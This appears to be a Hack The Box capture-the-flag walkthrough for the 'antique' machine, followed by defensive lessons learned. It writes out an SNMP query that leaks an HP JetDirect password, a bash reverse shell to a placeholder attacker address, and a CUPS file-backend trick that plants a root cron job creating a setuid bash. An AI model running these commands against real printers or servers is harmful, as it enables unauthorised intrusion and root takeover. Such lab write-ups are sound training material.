# antique — Hack The Box Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/HTB-antique-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
</p>

## Machine Information

- **Machine:** antique
- **Platform:** Hack The Box
- **IP:** `<IP_Machine>`

---

# Table of Contents

1. [TL;DR](#tldr)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration & Exploitation](#enumeration--exploitation)
4. [Privilege Escalation](#privilege-escalation)
5. [Flags](#flags)
6. [Lessons Learned](#lessons-learned)
7. [Conclusion](#conclusion)

---

# TL;DR

- SNMP (UDP/161) exposes a credential embedded in the HP JetDirect OID tree.
- Telnet (TCP/23) runs an HP JetDirect management interface, authenticated with the recovered credential.
- The JetDirect `exec` command provides direct OS command execution, yielding a shell as `lp`.
- The `lp` user belongs to the `lpadmin` group, which CUPS treats as `@SYSTEM`.
- CUPS file-backend abuse (`FileDevice=Yes` + a raw printer targeting `/etc/cron.d/`) is leveraged to write a cron rule as root.
- The cron rule creates a setuid-root copy of `/bin/bash`, granting full root access and the root flag.

---

# Reconnaissance

The initial scan covers both TCP and UDP, since restricting to TCP only would have missed the critical foothold on this machine.

```bash
nmap -Pn -sV -sC <IP_Machine>         # TCP service scan
nmap -Pn -sU -sV --top-ports 100 <IP_Machine>  # UDP top-ports scan
```

**TCP results** reveal only one open port:

| Port | Protocol | Service |
|------|----------|---------|
| 23   | TCP      | Telnet  |

**UDP results** reveal a second, equally important service:

| Port | Protocol | Service |
|------|----------|---------|
| 161  | UDP      | SNMP (SNMPv1, community string `public`) |

Telnet on its own is a weak lead — there is no way to know the credentials without additional context. The SNMP service, however, is unauthenticated under the default `public` community string, and SNMP trees for network-attached printers are well-documented to contain sensitive configuration data. This makes SNMP the natural first target.

---

# Enumeration & Exploitation

## Extracting the Credential via SNMP

HP JetDirect devices store their administrative password inside the proprietary OID `1.3.6.1.4.1.11.2.3.9.1.1.13.0`. Querying this OID with the default community string `public` returns raw bytes that, once decoded, reveal the password in plain text:

```bash
snmpget -v1 -c public <IP_Machine> 1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

After decoding the returned octet string, the credential is:

```
P@ssw0rd@123!!123
```

This single SNMP query is enough to pivot directly to the Telnet interface.

## Gaining a Shell via HP JetDirect Telnet

Connecting to TCP/23 presents an HP JetDirect management prompt. Supplying the recovered password authenticates successfully:

```bash
telnet <IP_Machine> 23
# Password: P@ssw0rd@123!!123
```

The JetDirect management interface exposes an `exec` command that passes its argument directly to the underlying Linux OS. This is a built-in feature of JetDirect firmware intended for administrative use, but when the device is network-accessible it becomes a straightforward unauthenticated-to-RCE primitive (one authentication step away from full OS access):

```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

From here, a reverse shell can be established. Using the `exec` command to invoke a bash reverse shell:

```
> exec bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1'
```

With a listener ready on the attacker machine:

```bash
nc -lvnp <port>
```

This lands a shell as the `lp` user. The user flag is readable from the home directory:

```bash
cat /home/lp/user.txt
```

---

# Privilege Escalation

## Understanding the Position: `lp` and CUPS

The `lp` user is a member of the `lpadmin` group. This is the key to everything. The CUPS configuration file `/etc/cups/cupsd.conf` contains the following directive:

```
SystemGroup lpadmin
```

This means any member of `lpadmin` is treated as a **CUPS system administrator** (`@SYSTEM`), with full control over the CUPS daemon — which itself runs as **root**.

## Enabling the File Backend

By default, CUPS disables URI schemes that write directly to the filesystem (`file:`) as a security precaution. However, since `lp` is `@SYSTEM` in CUPS, it can lift this restriction:

```bash
cupsctl FileDevice=Yes
```

This one command re-enables file-based printer backends, which will allow CUPS (running as root) to write arbitrary content to arbitrary file paths on the system.

## Creating a Malicious Printer

The next step is to register a printer whose backend URI points to a file the attacker controls — in this case, a cron drop-in directory writable only by root:

```bash
lpadmin -p cronprinter -E -v file:/etc/cron.d/pwn -m raw
```

This creates a printer named `cronprinter` that, when it receives a print job, will have CUPS write the raw job content directly into `/etc/cron.d/pwn` as root.

## Delivering the Payload via Print Job

The payload is a valid cron rule that instructs the root cron daemon to create a setuid-root copy of `/bin/bash` in the `lp` home directory:

```bash
echo "* * * * * root cp /bin/bash /home/lp/rootsh && chmod 4755 /home/lp/rootsh" | lp -d cronprinter
```

CUPS processes this job and, running as root, writes the content into `/etc/cron.d/pwn`. Within one minute, the system's cron daemon picks up the new rule and executes it as root, producing `/home/lp/rootsh` with the setuid bit set.

## Obtaining Root

```bash
/home/lp/rootsh -p -c 'cat /root/root.txt'
```

The `-p` flag preserves the effective UID (`euid=0`), giving a root-level execution context without spawning an interactive root shell. The root flag is read directly.

---

# Flags

- **user.txt**: `REDACTED`
- **root.txt**: `REDACTED`

---

# Lessons Learned

1. **SNMP with default community strings is a credential leak vector.** The `public` community string is enabled by default on countless embedded devices. Vendor-specific OID trees (such as HP's `1.3.6.1.4.1.11.*`) frequently store sensitive data — passwords included — that was never intended to be world-readable. Always disable SNMP or restrict community strings and access lists.

2. **Telnet exposes credentials in transit and should never be used over untrusted networks.** Even if the password had not been leaked via SNMP, Telnet transmits everything — including the password — in cleartext. Replace any Telnet management interface with SSH.

3. **Embedded device management interfaces that expose OS-level `exec` primitives are inherently dangerous.** The JetDirect `exec` command is a direct path from printer management to operating system compromise. Network printers should be isolated on a dedicated VLAN with no direct access from workstation or attacker segments.

4. **Group membership in printer administration groups has OS-level consequences.** The `lpadmin` → `@SYSTEM` → CUPS-runs-as-root chain is non-obvious. Service accounts like `lp` should follow the principle of least privilege and should not hold administrative authority over daemons that run as root.

5. **The CUPS `FileDevice` option is a dangerous privilege-escalation primitive.** Allowing `file:` URIs in CUPS backends gives any CUPS administrator the ability to write arbitrary content to any path on the filesystem as root. This option should remain disabled unless strictly necessary, and if enabled, must be protected by strong access controls.

---

# Conclusion

Antique demonstrates how a single misconfigured UDP service — SNMP with a default community string — can unravel an entire system. The password hidden in HP JetDirect's proprietary OID tree unlocks a Telnet management interface, whose `exec` command turns printer administration into remote code execution. From there, the `lp` user's membership in `lpadmin` provides administrative authority over the CUPS daemon, which runs as root. By re-enabling the file backend and registering a printer that writes to `/etc/cron.d/`, the attacker coerces CUPS into planting a root-owned cron job, yielding full system compromise. Every step in this chain relies on a default, a legacy protocol, or a feature that was never designed with a hostile network in mind — a recurring theme in embedded and print-server security.